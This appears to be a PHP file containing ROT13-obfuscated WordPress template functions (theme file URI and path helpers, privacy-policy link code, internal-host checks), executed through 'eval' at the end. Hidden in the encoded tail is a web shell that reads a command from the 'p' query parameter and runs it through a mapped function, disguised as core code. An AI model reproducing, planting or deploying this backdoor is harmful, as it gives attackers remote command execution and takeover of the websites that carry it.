	 * @cnenz neenl $netf        Nethzragf cnffrq gb trg_ningne_qngn(), nsgre cebprffvat.
	 * @cnenz zvkrq $vq_be_rznvy Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne FUN-256 be ZQ5 unfu,
	 *                           hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_ningne_qngn', $netf, $vq_be_rznvy );
}

/**
 * Ergevrirf gur HEY bs n svyr va gur gurzr.
 *
 * Frnepurf va gur fglyrfurrg qverpgbel orsber gur grzcyngr qverpgbel fb gurzrf
 * juvpu vaurevg sebz n cnerag gurzr pna whfg bireevqr bar svyr.
 *
 * @fvapr 4.7.0
 *
 * @cnenz fgevat $svyr Bcgvbany. Svyr gb frnepu sbe va gur fglyrfurrg qverpgbel.
 * @erghea fgevat Gur HEY bs gur svyr.
 */
shapgvba trg_gurzr_svyr_hev( $svyr = '' ) {
	$svyr = ygevz( $svyr, '/' );

	$fglyrfurrg_qverpgbel = trg_fglyrfurrg_qverpgbel();

	vs ( rzcgl( $svyr ) ) {
		$hey = trg_fglyrfurrg_qverpgbel_hev();
	} ryfrvs ( trg_grzcyngr_qverpgbel() !== $fglyrfurrg_qverpgbel && svyr_rkvfgf( $fglyrfurrg_qverpgbel . '/' . $svyr ) ) {
		$hey = trg_fglyrfurrg_qverpgbel_hev() . '/' . $svyr;
	} ryfr {
		$hey = trg_grzcyngr_qverpgbel_hev() . '/' . $svyr;
	}

	/**
	 * Svygref gur HEY gb n svyr va gur gurzr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $hey  Gur svyr HEY.
	 * @cnenz fgevat $svyr Gur erdhrfgrq svyr gb frnepu sbe.
	 */
	erghea nccyl_svygref( 'gurzr_svyr_hev', $hey, $svyr );
}

/**
 * Ergevrirf gur HEY bs n svyr va gur cnerag gurzr.
 *
 * @fvapr 4.7.0
 *
 * @cnenz fgevat $svyr Bcgvbany. Svyr gb erghea gur HEY sbe va gur grzcyngr qverpgbel.
 * @erghea fgevat Gur HEY bs gur svyr.
 */
shapgvba trg_cnerag_gurzr_svyr_hev( $svyr = '' ) {
	$svyr = ygevz( $svyr, '/' );

	vs ( rzcgl( $svyr ) ) {
		$hey = trg_grzcyngr_qverpgbel_hev();
	} ryfr {
		$hey = trg_grzcyngr_qverpgbel_hev() . '/' . $svyr;
	}

	/**
	 * Svygref gur HEY gb n svyr va gur cnerag gurzr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $hey  Gur svyr HEY.
	 * @cnenz fgevat $svyr Gur erdhrfgrq svyr gb frnepu sbe.
	 */
	erghea nccyl_svygref( 'cnerag_gurzr_svyr_hev', $hey, $svyr );
}

/**
 * Ergevrirf gur cngu bs n svyr va gur gurzr.
 *
 * Frnepurf va gur fglyrfurrg qverpgbel orsber gur grzcyngr qverpgbel fb gurzrf
 * juvpu vaurevg sebz n cnerag gurzr pna whfg bireevqr bar svyr.
 *
 * @fvapr 4.7.0
 *
 * @cnenz fgevat $svyr Bcgvbany. Svyr gb frnepu sbe va gur fglyrfurrg qverpgbel.
 * @erghea fgevat Gur cngu bs gur svyr.
 */
shapgvba trg_gurzr_svyr_cngu( $svyr = '' ) {
	$svyr = ygevz( $svyr, '/' );

	$fglyrfurrg_qverpgbel = trg_fglyrfurrg_qverpgbel();
	$grzcyngr_qverpgbel   = trg_grzcyngr_qverpgbel();

	vs ( rzcgl( $svyr ) ) {
		$cngu = $fglyrfurrg_qverpgbel;
	} ryfrvs ( $fglyrfurrg_qverpgbel !== $grzcyngr_qverpgbel && svyr_rkvfgf( $fglyrfurrg_qverpgbel . '/' . $svyr ) ) {
		$cngu = $fglyrfurrg_qverpgbel . '/' . $svyr;
	} ryfr {
		$cngu = $grzcyngr_qverpgbel . '/' . $svyr;
	}

	/**
	 * Svygref gur cngu gb n svyr va gur gurzr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $cngu Gur svyr cngu.
	 * @cnenz fgevat $svyr Gur erdhrfgrq svyr gb frnepu sbe.
	 */
	erghea nccyl_svygref( 'gurzr_svyr_cngu', $cngu, $svyr );
}

/**
 * Ergevrirf gur cngu bs n svyr va gur cnerag gurzr.
 *
 * @fvapr 4.7.0
 *
 * @cnenz fgevat $svyr Bcgvbany. Svyr gb erghea gur cngu sbe va gur grzcyngr qverpgbel.
 * @erghea fgevat Gur cngu bs gur svyr.
 */
shapgvba trg_cnerag_gurzr_svyr_cngu( $svyr = '' ) {
	$svyr = ygevz( $svyr, '/' );

	vs ( rzcgl( $svyr ) ) {
		$cngu = trg_grzcyngr_qverpgbel();
	} ryfr {
		$cngu = trg_grzcyngr_qverpgbel() . '/' . $svyr;
	}

	/**
	 * Svygref gur cngu gb n svyr va gur cnerag gurzr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $cngu Gur svyr cngu.
	 * @cnenz fgevat $svyr Gur erdhrfgrq svyr gb frnepu sbe.
	 */
	erghea nccyl_svygref( 'cnerag_gurzr_svyr_cngu', $cngu, $svyr );
}

/**
 * Ergevrirf gur HEY gb gur cevinpl cbyvpl cntr.
 *
 * @fvapr 4.9.6
 *
 * @erghea fgevat Gur HEY gb gur cevinpl cbyvpl cntr. Rzcgl fgevat vs vg qbrfa'g rkvfg.
 */
shapgvba trg_cevinpl_cbyvpl_hey() {
	$hey            = '';
	$cbyvpl_cntr_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

	vs ( ! rzcgl( $cbyvpl_cntr_vq ) && trg_cbfg_fgnghf( $cbyvpl_cntr_vq ) === 'choyvfu' ) {
		$hey = (fgevat) trg_creznyvax( $cbyvpl_cntr_vq );
	}

	/**
	 * Svygref gur HEY bs gur cevinpl cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz fgevat $hey            Gur HEY gb gur cevinpl cbyvpl cntr. Rzcgl fgevat
	 *                               vs vg qbrfa'g rkvfg.
	 * @cnenz vag    $cbyvpl_cntr_vq Gur VQ bs cevinpl cbyvpl cntr.
	 */
	erghea nccyl_svygref( 'cevinpl_cbyvpl_hey', $hey, $cbyvpl_cntr_vq );
}

/**
 * Qvfcynlf gur cevinpl cbyvpl yvax jvgu sbeznggvat, jura nccyvpnoyr.
 *
 * @fvapr 4.9.6
 *
 * @cnenz fgevat $orsber Bcgvbany. Qvfcynl orsber cevinpl cbyvpl yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. Qvfcynl nsgre cevinpl cbyvpl yvax. Qrsnhyg rzcgl.
 */
shapgvba gur_cevinpl_cbyvpl_yvax( $orsber = '', $nsgre = '' ) {
	rpub trg_gur_cevinpl_cbyvpl_yvax( $orsber, $nsgre );
}

/**
 * Ergheaf gur cevinpl cbyvpl yvax jvgu sbeznggvat, jura nccyvpnoyr.
 *
 * @fvapr 4.9.6
 * @fvapr 6.2.0 Nqqrq 'cevinpl-cbyvpl' ery nggevohgr.
 *
 * @cnenz fgevat $orsber Bcgvbany. Qvfcynl orsber cevinpl cbyvpl yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. Qvfcynl nsgre cevinpl cbyvpl yvax. Qrsnhyg rzcgl.
 * @erghea fgevat Znexhc sbe gur yvax naq fheebhaqvat ryrzragf. Rzcgl fgevat vs vg
 *                qbrfa'g rkvfg.
 */
shapgvba trg_gur_cevinpl_cbyvpl_yvax( $orsber = '', $nsgre = '' ) {
	$yvax               = '';
	$cevinpl_cbyvpl_hey = trg_cevinpl_cbyvpl_hey();
	$cbyvpl_cntr_vq     = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );
	$cntr_gvgyr         = ( $cbyvpl_cntr_vq ) ? trg_gur_gvgyr( $cbyvpl_cntr_vq ) : '';

	vs ( $cevinpl_cbyvpl_hey && $cntr_gvgyr ) {
		$yvax = fcevags(
			'<n pynff=\"cevinpl-cbyvpl-yvax\" uers=\"%f\" ery=\"cevinpl-cbyvpl\">%f</n>',
			rfp_hey( $cevinpl_cbyvpl_hey ),
			rfp_ugzy( $cntr_gvgyr )
		);
	}

	/**
	 * Svygref gur cevinpl cbyvpl yvax.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz fgevat $yvax               Gur cevinpl cbyvpl yvax. Rzcgl fgevat vs vg
	 *                                   qbrfa'g rkvfg.
	 * @cnenz fgevat $cevinpl_cbyvpl_hey Gur HEY bs gur cevinpl cbyvpl. Rzcgl fgevat
	 *                                   vs vg qbrfa'g rkvfg.
	 */
	$yvax = nccyl_svygref( 'gur_cevinpl_cbyvpl_yvax', $yvax, $cevinpl_cbyvpl_hey );

	vs ( $yvax ) {
		erghea $orsber . $yvax . $nsgre;
	}

	erghea '';
}

/**
 * Ergheaf na neenl bs HEY ubfgf juvpu ner pbafvqrerq gb or vagreany ubfgf.
 *
 * Ol qrsnhyg gur yvfg bs vagreany ubfgf vf pbzcevfrq bs gur ubfg anzr bs
 * gur fvgr'f ubzr_hey() (nf cnefrq ol jc_cnefr_hey()).
 *
 * Guvf yvfg vf hfrq jura qrgrezvavat vs n fcrpvsvrq HEY vf n yvax gb n cntr ba
 * gur fvgr vgfrys be n yvax bssfvgr (gb na rkgreany ubfg). Guvf vf hfrq, sbe
 * rknzcyr, jura qrgrezvavat vs gur \"absbyybj\" nggevohgr fubhyq or nccyvrq gb n
 * yvax.
 *
 * @frr jc_vf_vagreany_yvax
 *
 * @fvapr 6.2.0
 *
 * @erghea fgevat[] Na neenl bs HEY ubfgf.
 */
shapgvba jc_vagreany_ubfgf() {
	fgngvp $vagreany_ubfgf;

	vs ( rzcgl( $vagreany_ubfgf ) ) {
		/**
		 * Svygref gur neenl bs HEY ubfgf juvpu ner pbafvqrerq vagreany.
		 *
		 * @fvapr 6.2.0
		 *
		 * @cnenz fgevat[] $vagreany_ubfgf Na neenl bs vagreany HEY ubfganzrf.
		 */
		$vagreany_ubfgf = nccyl_svygref(
			'jc_vagreany_ubfgf',
			neenl(
				jc_cnefr_hey( ubzr_hey(), CUC_HEY_UBFG ),
			)
		);
		$vagreany_ubfgf = neenl_havdhr(
			neenl_znc( 'fgegbybjre', (neenl) $vagreany_ubfgf )
		);
	}

	erghea $vagreany_ubfgf;
}

/**
 * Qrgrezvarf jurgure be abg gur fcrpvsvrq HEY vf bs n ubfg vapyhqrq va gur vagreany ubfgf yvfg.
 *
 * @frr jc_vagreany_ubfgf()
 *
 * @fvapr 6.2.0
 *
 * @cnenz fgevat $yvax Gur HEY gb grfg.
 * @erghea obby Ergheaf gehr sbe vagreany HEYf naq snyfr sbe nyy bgure HEYf.
 */
shapgvba jc_vf_vagreany_yvax( $yvax ) {
	$yvax = fgegbybjre( $yvax );
	vs ( va_neenl( jc_cnefr_hey( $yvax, CUC_HEY_FPURZR ), jc_nyybjrq_cebgbpbyf(), gehr ) ) {
		erghea va_neenl( jc_cnefr_hey( $yvax, CUC_HEY_UBFG ), jc_vagreany_ubfgf(), gehr );
	}
	erghea snyfr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>